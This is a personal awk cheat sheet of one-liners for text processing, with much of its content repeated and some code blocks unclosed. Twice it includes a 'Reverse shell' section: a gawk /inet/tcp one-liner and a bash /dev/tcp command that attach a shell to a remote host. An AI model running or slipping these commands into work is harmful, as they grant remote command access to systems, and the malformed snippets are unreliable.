# awk

### AWK/Nawk/Gawk

```
AWK - the (very old) *original* from `AT&T`
NAWK - A newer, improved version from `AT&T`
GAWK - The Free Software foundation's version
```

### AWK patterns may be one of the following:

```
BEGIN
END
BEGINFILE
ENDFILE
/regular expression/
relational expression
pattern && pattern
pattern || pattern
pattern ? pattern : pattern
(pattern)
! pattern
pattern1, pattern2
```

### Print hello world
```sh
awk 'BEGIN { print _"hello, world" }'   
```
### Numbering files
```sh
cat <file>.txt|awk '{ print NR, $0 }'
```
### Print example
```sh
awk 'BEGIN { print "line one\nline two\nline three" }'
```
### Print from file
```sh
awk '{ print $1, $2 } <file>   
```
### Print the first column from all rows
```sh
awk '{print $1}'
```
### Add tabs for print
```sh
awk '{print NR "\t" $0}'
```
### Print the first and third columns from all rows:O
```sh
awk '{print $1, $3}'
```
### Print the last word
```sh
awk '{print $NF}'
```
### Print everything after first ,
```sh
awk -F ',' '{print $2}'
```
### Remove empty lines
```sh
awk 'NF > 0'
```
### Remove empty lines
```sh
awk NF
```
### Remove empty lines
```sh
awk '!/^$/'
```
### Count lines, similiar to wc -l
```sh
awk 'END{print NR}'
```
### Numbering lines, begin on 0
```sh
awk '{print i++ "," $0}'
```
### Numbering lines, begins on 1 and add 1 > foop 
```sh
awk '{print NR  "> " $s}'
### Check for duplicates, unique only
```sh
awk '!seen[$0]++'
```

### Print total lines (same as wc -l)
```sh
awk 'END{print NR}'
```
### Triple space all lines
```sh
awk '1;{print "\n"}'
```
### Setup 2 files side by side
paste 1 2|awk -F'\t' '{ printf("%-30s %s\n", $1, $2) }'
```
### Reverse shell 
```sh
awk 'BEGIN{s="/inet/tcp/0/192.168.1.104/1337";while(1){if((s|&getline c)<0||c=="exit")break;while(c&&(c|&getline)>0)print$0|&s;close(c)}}'
```
### Connect to above shell
```sh
bash -c '0<&60-;exec 60<>/dev/tcp/<LHOST>/<LPORT>;sh <&60 >&60 2>&60' 2> /dev/null
```
### Print side by side
```sh
awk -F'\t' '{ printf("%-30s %s\n", $1, $2) }'
```
### Print hello world
```sh
awk 'BEGIN { print _"hello, world" }
```
### Numbering files
```sh
cat <file>.txt|awk '{ print NR, $0 }'
```
### Print example
```sh
awk 'BEGIN { print "line one\nline two\nline three" }'
```
### Print from file
```sh
awk '{ print $1, $2 } <file>  
```
### Print the first column from all rows
```sh
awk '{print $1}'
```
### Add tabs for print
```sh
awk '{print NR "\t" $0}'
```
### Print the first and third columns from all rows:O
```sh
awk '{print $1, $3}'
```
### Print the last word
```sh
awk '{print $NF}'
```
### Print everything after first ,
```sh
awk -F ',' '{print $2}'
```
### Remove empty lines
```sh
awk 'NF > 0'
```
### Remove empty lines
```sh
awk NF
```
### Remove empty lines
```sh
awk '!/^$/'
```
### Count lines, similiar to wc -l
```sh
awk 'END{print NR}'
```
### Numbering lines, begin on 0
```sh
awk '{print i++ "," $0}'
```
### Numbering lines, begins on 1 and add 1 > foop 
```sh
awk '{print NR  "> " $s}'
```
### Check for duplicates, unique only
```sh
awk '!seen[$0]++'
```
### Print total lines (same as wc -l)
```sh
awk 'END{print NR}'
```
### Triple space all lines
```sh
awk '1;{print "\n"}'
```
### Setup 2 files side by side
```sh
paste file1.txt file2.txt|awk -F'\t' '{ printf("%-30s %s\n", $1, $2) }'
```

### Reverse shell 

* Listen Server

```sh
awk 'BEGIN{s="/inet/tcp/0/192.168.1.104/1337";while(1){if((s|&getline c)<0||c=="exit")break;while(c&&(c|&getline)>0)print$0|&s;close(c)}}'

```
* Connect to reverse shell above

```sh
bash -c '0<&60-;exec 60<>/dev/tcp/<LHOST>/<LPORT>;sh <&60 >&60 2>&60' 2> /dev/null
```

### Print side by side

```sh
awk -F'\t' '{ printf("%-30s %s\n", $1, $2) }'
```
### Unknown
```sh
awk -v on="$(tput bold)" -v off="$(tput rmso)" '{ $2=on $2 off }; 1'
```

### Add a blank line after every 5th line

```sh
seq 10|awk '{ print; } NR % 5 == 0 { print ""; }'
1
2
3
4
5

6
7
8
9
10
```

### Insert mmmmmmm at every 10 line

cat lsof|awk '(NR-3)%10||$0="mmmmmmmmmmmmmm" RS $0'

### Insert record set-X where X is number of times it was inserted

cat lsof|awk '(NR-1)%2||$0="record set-"++i RS $0'


### Insert a empty line after every 3 words

```sh
awk 'BEGIN{ORS="\n\n\n"};1'
```

### Uppercasing First Letter of Words Using AWK

```sh
echo wuseman|awk '{for(i=1;i<=NF;i++){ $i=toupper(substr($i,1,1)) substr($i,2) }}1'
```

### Make a jump after every second string

```sh
awk '{ cur = substr($0,1,1) } NR > 1 && cur != prev { print "" } { prev = cur; print }
```
## AWK Tools/Scripts

### Sort by alphabet
```sh
awk '
  {a[$2" "$1]=$3} 
  END {
    n=asorti(a,b); for (i=1;i<=n;i++) {split(b[i],s); print s[2], s[1], a[b[i]]}
}' file
```

### Find the latest file by modified date
```sh
find . -type f -printf '%T@ %p\n' | awk '
    BEGIN { mostrecenttime = 0; mostrecentline = "nothing"; }
    {   
        if ($1 > mostrecenttime)
            { mostrecenttime = $1; mostrecentline = $0; }
    }   
    END { print mostrecentline; }' | cut -f2- -d ' '
```

### Print in columns

```sh
awk '
        NR==FNR { if (length > max_length) max_length = length
                  max_FNR = FNR
                  save[FNR] = $0
                  next
                }
                { printf "%-*s", max_length+2, save[FNR]
                  print
                }
        END     { if (FNR < max_FNR) {
                        for (i=FNR+1; i <= max_FNR; i++) print save[i]
                  }
                }
    ' file1.txt file2.txt
```

## Live editor:

https://awk.js.org/

## Good Resources

https://www.grymoire.com/Unix/Awk.html
https://www.gnu.org/software/gawk/manual/gawk.html
https://backreference.org/2014/01/22/pulling-out-strings/index.html
https://learnbyexample.github.io/learn_gnuawk/record-separators.html
